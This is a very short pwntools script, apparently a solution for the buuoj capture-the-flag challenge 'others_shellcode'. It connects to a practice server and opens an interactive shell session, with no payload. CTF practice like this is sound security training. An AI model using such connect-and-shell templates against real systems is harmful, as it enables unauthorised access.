from pwn import *


def others_shellcode(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/others_shellcode'):
    context(log_level='debug', arch='i386', os='linux')
    target = remote('node5.buuoj.cn', 26928)

    target.interactive()


if __name__ == '__main__':
    others_shellcode()
